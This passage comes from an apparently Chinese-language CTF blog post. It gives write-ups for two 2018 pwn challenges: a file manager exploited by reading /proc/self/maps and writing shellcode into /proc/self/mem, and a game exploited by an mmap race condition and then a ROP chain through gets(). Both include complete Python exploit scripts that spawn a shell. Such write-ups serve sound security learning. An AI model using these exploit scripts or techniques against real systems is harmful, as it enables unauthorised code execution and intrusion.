ELF(<span class="string">&#x27;/lib/i386-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">        exploit()</span><br></pre></td></tr></table></figure>

<h2 id="文件管理器"><a href="#文件管理器" class="headerlink" title="文件管理器"></a>文件管理器</h2><p>本以为应该是比较棘手的题目</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">➜  workspace file fileManager</span><br><span class="line">fileManager: ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, <span class="keyword">for</span> GNU/Linux 2.6.32, BuildID[sha1]=93615ea271d45b23c3abf39e55cdeb7c2746c1f0, not stripped</span><br><span class="line">➜  workspace checksec fileManager</span><br><span class="line">[*] <span class="string">&#x27;/Users/apple/Binary/CTF/2018/cyber2018/Pwn/file/workspace/fileManager&#x27;</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
<p>可是题目提供了对任意文件读写的能力，而且没有做沙箱的限制，我们能够通过目录操作读写任意文件</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">unsigned</span> <span class="type">int</span> <span class="title">read_file</span><span class="params">()</span></span>&#123;<span class="comment">//任意读文件</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;模块名称:&quot;</span>);</span><br><span class="line">  <span class="built_in">read_buff</span>((<span class="type">int</span>)&amp;file, <span class="number">64</span>, <span class="number">10</span>);</span><br><span class="line">  fd = <span class="built_in">open</span>(&amp;file, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;查找模块偏移量:&quot;</span>);</span><br><span class="line">    offset = <span class="built_in">read_ul</span>();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%lld\n&quot;</span>, offset, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%llx\n&quot;</span>, offset, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">for</span> ( nbytes = <span class="number">-1</span>; nbytes &lt; <span class="number">0</span> || nbytes &gt; <span class="number">256</span>; nbytes = <span class="built_in">read_int</span>() )</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;模块读取大小:&quot;</span>);</span><br><span class="line">    <span class="built_in">lseek</span>(fd, offset, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">0x120u</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;模块内容&quot;</span>);</span><br><span class="line">    <span class="built_in">read</span>(fd, &amp;s, nbytes);</span><br><span class="line">    <span class="built_in">puts</span>(&amp;s);</span><br><span class="line">    <span class="built_in">close</span>(fd);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">unsigned</span> <span class="type">int</span> <span class="title">write_file</span><span class="params">()</span></span>&#123;<span class="comment">//任意写文件</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;模块名称:&quot;</span>);</span><br><span class="line">  <span class="built_in">read_buff</span>((<span class="type">int</span>)&amp;file, <span class="number">64</span>, <span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">  fd = <span class="built_in">open</span>(&amp;file, <span class="number">0x41</span>, <span class="number">0x1B6</span>);</span><br><span class="line">  <span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">for</span> ( offset = <span class="number">-1</span>; offset &lt; <span class="number">0</span>; offset = <span class="built_in">read_int</span>() )</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;写入模块偏移量:&quot;</span>);</span><br><span class="line">    <span class="built_in">lseek</span>(fd, offset, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">for</span> ( n = <span class="number">-1</span>; n &lt; <span class="number">0</span> || n &gt; <span class="number">256</span>; n = <span class="built_in">read_int</span>() )</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;模块写入大小:&quot;</span>);</span><br><span class="line">    <span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">0x100u</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;写入模块:&quot;</span>);</span><br><span class="line">    <span class="built_in">read_buff</span>((<span class="type">int</span>)&amp;s, n, <span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">    <span class="built_in">write</span>(fd, &amp;s, n);</span><br><span class="line">    <span class="built_in">close</span>(fd);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>tip在于procfs <a target="_blank" rel="noopener" href="http://tacxingxing.com/2018/01/19/procfs/">Proc File System</a><br>我们可以通过读&#x2F;proc&#x2F;self&#x2F;maps来泄露程序基地址，Bypass PIE<br>之后通过写&#x2F;proc&#x2F;self&#x2F;mem来注入shellcode，通过程序流程执行shellcode，拿到Shell</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#/usr/env/bin python</span></span><br><span class="line"><span class="comment">#-*- coding: utf-8 -*- </span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>(<span class="params">Name,Offset,Length</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;3. 退出\n&#x27;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;模块名称:&#x27;</span>,Name)</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;查找模块偏移量:&#x27;</span>,<span class="built_in">str</span>(Offset))</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;模块读取大小:&#x27;</span>,<span class="built_in">str</span>(Length))</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;模块内容&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write</span>(<span class="params">Name,Offset,Length,Content</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;3. 退出\n&#x27;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;模块名称:&#x27;</span>,Name)</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;写入模块偏移量:&#x27;</span>,<span class="built_in">str</span>(Offset))</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;模块写入大小:&#x27;</span>,<span class="built_in">str</span>(Length))</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;写入模块:&#x27;</span>,Content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exploit</span>():</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;请登录FTP:&#x27;</span>,<span class="string">&#x27;xingxing&#x27;</span>)</span><br><span class="line">    read(<span class="string">&quot;/proc/self/maps&quot;</span>,<span class="number">0</span>,<span class="number">0x100</span>)</span><br><span class="line">    proc_base = <span class="built_in">int</span>(io.recvuntil(<span class="string">&#x27;-&#x27;</span>,drop=<span class="literal">True</span>),<span class="number">16</span>)</span><br><span class="line">    log.info(<span class="string">&#x27;proc_base:&#x27;</span>+<span class="built_in">hex</span>(proc_base))</span><br><span class="line">    </span><br><span class="line">    address = proc_base+<span class="number">0x1154</span></span><br><span class="line">    shellcode = asm(shellcraft.linux.sh())</span><br><span class="line">    <span class="comment">#gdb.attach(io)</span></span><br><span class="line">    write(<span class="string">&#x27;/proc/self/mem&#x27;</span>,address,<span class="number">0x100</span>,shellcode)</span><br><span class="line"></span><br><span class="line">    io.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    context.binary = <span class="string">&quot;./fileManager&quot;</span></span><br><span class="line">    context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;sp&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">    <span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">    elf = ELF(<span class="string">&#x27;./fileManager&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv)&gt;<span class="number">1</span>:</span><br><span class="line">        io = remote(sys.argv[<span class="number">1</span>],sys.argv[<span class="number">2</span>])</span><br><span class="line">        libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line">        exploit()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        io = process(<span class="string">&#x27;./fileManager&#x27;</span>)</span><br><span class="line">        libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line">        exploit()</span><br></pre></td></tr></table></figure>
<h2 id="黑客游戏"><a href="#黑客游戏" class="headerlink" title="黑客游戏"></a>黑客游戏</h2><p>题目是一个游戏，描述的Hero与Master战斗的游戏<br>通过名称容易发现有一个简单的栈溢出漏洞</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">attack</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    .......</span><br><span class="line">  <span class="keyword">if</span> ( result &lt;= <span class="number">0</span> )                            <span class="comment">// monster血量达到下限，胜利</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;you win&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( *(_DWORD *)gMonster == <span class="number">3</span> )             <span class="comment">//杀死level3的maseter</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;we will remember you forever!&quot;</span>);</span><br><span class="line">      <span class="built_in">vul_func</span>();</span><br><span class="line">      <span class="built_in">release_all</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    ......</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">vul_func</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">char</span> s; <span class="comment">// [esp+0h] [ebp-48h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;what&#x27;s your name:&quot;</span>);</span><br><span class="line">  <span class="built_in">gets</span>(&amp;s);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;ok! %s ,welcome\n&quot;</span>, &amp;s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>我们的目的在于打败level0-level4的master，从而进入函数中做ROP</p>
<p>打败怪兽无非就是自己攻击力高，或者回复血量快<br>首先同一个等级下hero的血量上限低于master</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">recovery_hp</span>((<span class="type">int</span>)gHero, <span class="number">50</span> * (*(_DWORD *)gHero + <span class="number">1</span>));</span><br><span class="line"><span class="built_in">recovery_hp</span>(gMonster, <span class="number">70</span> * (*(_DWORD *)gMonster + <span class="number">1</span>));</span><br></pre></td></tr></table></figure>
<p>并且在attack过程中，约定hero与master都有一个attack和defense<br>如果$hero_attack&gt;master_defense，master-&#x3D;hero_attack-master_defense$<br>否则$master_attack&gt;hero_defense，hero-&#x3D;master_attack-hero_defense$<br>这个能力还可以通过相应的技能加成</p>
<p>master每死一次，就会升级一次，能力也逐渐增强，而hero可选技能，但是只能选择0-3的技能，不能选择到最Bug的DDOS “have botnet”的，所以最强的也就是Overflow Attack，能力也就能与level2的master刚一刚<br>即使我们考虑回血，hero与master回血能力相同，所以遇到level3的<br>所以，这样看下来，hero必败。</p>
<p>注意到hero的信息能够存放在文件中，下次玩的时候可直接登录，并且保存等级状态等,每次登录后都将文件mmap到了内存中:</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> *__cdecl <span class="title">init_db</span><span class="params">(<span class="type">char</span> *file)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">void</span> *result; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  v1 = <span class="built_in">open</span>(file, <span class="number">2</span>);</span><br><span class="line">  gfd = v1;</span><br><span class="line">  result = <span class="built_in">mmap</span>(<span class="number">0</span>, <span class="number">0x1000u</span>, <span class="number">3</span>, <span class="number">1</span>, v1, <span class="number">0</span>);</span><br><span class="line">  gHero = result;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>文件的实时数据mmap映射到了内存这样可能会造成Race-conditon,即文件TOCTTOU<br>我们可以通过开启两个同一个用户下的游戏，一个打怪兽，另一个不断给自己加血来赢得游戏<br>因为TOCTTOU，每次两个进程的hero的信息，血量等是同步的mmap，所以造成了游戏出现了必胜策略<br>最后进入vnln函数，做ROP getshell即可</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#/usr/env/bin python</span></span><br><span class="line"><span class="comment">#-*- coding: utf-8 -*- </span></span><br><span class="line"><span class="keyword">from</span> zio <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">r_m1 = COLORED(RAW, <span class="string">&quot;green&quot;</span>)</span><br><span class="line">w_m1 = COLORED(RAW, <span class="string">&quot;blue&quot;</span>)</span><br><span class="line"></span><br><span class="line">r_m2 = COLORED(RAW, <span class="string">&quot;yellow&quot;</span>)</span><br><span class="line">w_m2 = COLORED(RAW, <span class="string">&quot;red&quot;</span>)</span><br><span class="line">target = <span class="string">&#x27;./play&#x27;</span></span><br><span class="line"><span class="comment">#target=(&#x27;47.104.90.157&#x27;,30003)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>(<span class="params">io,Username</span>):</span><br><span class="line">    io.read_until(<span class="string">&#x27;login:&#x27;</span>)</span><br><span class="line">    io.writeline(<span class="string">&#x27;xingxing&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">attack</span>(<span class="params">io</span>):</span><br><span class="line">    io.read_until(<span class="string">&#x27;&gt;&gt; &#x27;</span>)</span><br><span class="line">    io.writeline(<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    io.read_until(<span class="string">&#x27;(1:yes/0:no):&#x27;</span>)</span><br><span class="line">    io.writeline(<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">runaway</span>(<span class="params">io</span>):</span><br><span class="line">    io.read_until(<span class="string">&#x27;&gt;&gt; &#x27;</span>)</span><br><span class="line">    io.writeline(<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exploit</span>():</span><br><span class="line">    </span><br><span class="line">    io1 = zio(target,timeout=<span class="number">2</span>,print_read=r_m1,print_write=w_m1)</span><br><span class="line">    login(io1,<span class="string">&#x27;xingxing&#x27;</span>)</span><br><span class="line">    <span class="comment">#change methods =&gt; overflow attack</span></span><br><span class="line">    io1.read_until(<span class="string">&#x27;&gt;&gt; &#x27;</span>)</span><br><span class="line">    io1.writeline(<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    io1.read_until(<span class="string">&#x27;&gt;&gt; &#x27;</span>)</span><br><span class="line">    io1.writeline(<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#For win</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">        attack(io1)</span><br><span class="line">    io2 = zio(target,timeout=<span class="number">2</span>,print_read=r_m2,print_write=w_m2)</span><br><span class="line">    login(io2,<span class="string">&#x27;xingxing&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">        runaway(io2)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">        attack(io1)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">        attack(io1)</span><br><span class="line">        temp = io1.readline()</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;win&quot;</span> <span class="keyword">in</span> temp:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">12</span>):</span><br><span class="line">            runaway(io2)</span><br><span class="line">    io2.close()</span><br><span class="line">    </span><br><span class="line">    payload = <span class="number">0x4c</span>*<span class="string">&#x27;A&#x27;</span></span><br><span class="line">    payload += l32(<span class="number">0x08048670</span>)+l32(<span class="number">0x8048EC7</span>)+l32(<span class="number">0x804B02C</span>)</span><br><span class="line">    io1.read_until(<span class="string">&#x27;s your name:&#x27;</span>)</span><br><span class="line">    io1.writeline(payload)</span><br><span class="line"></span><br><span class="line">    io1.read_until(<span class="string">&#x27;welcome\n&#x27;</span>)</span><br><span class="line">    puts_addr = l32(io1.read(<span class="number">4</span>))</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;puts_addr:&#x27;</span>+<span class="built_in">hex</span>(puts_addr)</span><br><span class="line">    libc_base = puts_addr-<span class="number">0x5fca0</span></span><br><span class="line">    system_addr = libc_base+<span class="number">0x3ada0</span></span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;system_addr:&#x27;</span>+<span class="built_in">hex</span>(system_addr)</span><br><span class="line">    binsh_addr = libc_base+<span class="number">0x15ba0b</span></span><br><span class="line"></span><br><span class="line">    payload = <span class="number">0x4c</span>*<span class="string">&#x27;A&#x27;</span>+l32(system_addr)+l32(<span class="number">0xdeadbeef</span>)+l32(binsh_addr)</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;binsh_addr:&#x27;</span>+<span class="built_in">hex</span>(binsh_addr)</span><br><span class="line"></span><br><span class="line">    io1.read_until(<span class="string">&#x27;s your name:&#x27;</span>)</span><br><span class="line">    <span class="comment">#io1.gdb_hint()</span></span><br><span class="line">    io1.writeline(payload)</span><br><span class="line">    </span><br><span class="line">    io1.interact()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    exploit()</span><br></pre></td></tr></table></figure>


      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2018/10/17/2018%E8%B5%9B%E5%8D%9A%E5%B7%A5%E6%8E%A7ctf/" data-id="cuidBCYnS4Y1AKwgYfzGG_rv6" data-title="2018 赛博杯工控CTF" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  


  <nav id="page-nav">
    
    <a class="extend prev" rel="prev" href="/">&laquo; Prev</a><a class="page-number" href="/">1</a><span class="page-number current">2</span>
  </nav>

</section>
        
          <aside id="sidebar">
  
    

  
    

  
    
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/11/">November 2025</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/10/">October 2025</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/09/">September 2025</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/08/">August 2025</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/12/">December 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/11/">November 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/01/">January 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/12/">December 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/11/">November 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/08/">August 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/10/">October 2018</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2025/11/18/2018bctf/">(no title)</a>
          </li>
        
          <li>
            <a href="/2025/11/18/2018%E7%BD%91%E9%BC%91%E6%9D%AFctf/">(no title)</a>
          </li>
        
          <li>
            <a href="/2025/11/18/n1ctfjunior-re/">n1ctfjunior-re</a>
          </li>
        
          <li>
            <a href="/2025/11/01/qwb2025-re/">qwb2025-re</a>
          </li>
        
          <li>
            <a href="/2025/10/25/qwb2025-pwn/">qwb2025-pwn flagmarket</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      
      &copy; 2025 xrivendell7<br>
      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>

    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    


<script src="/js/jquery-3.6.4.min.js"></script>



  
<script src="/fancybox/jquery.fancybox.min.js"></script>




<script src="/js/script.js"></script>





  </div>
</body>
</html>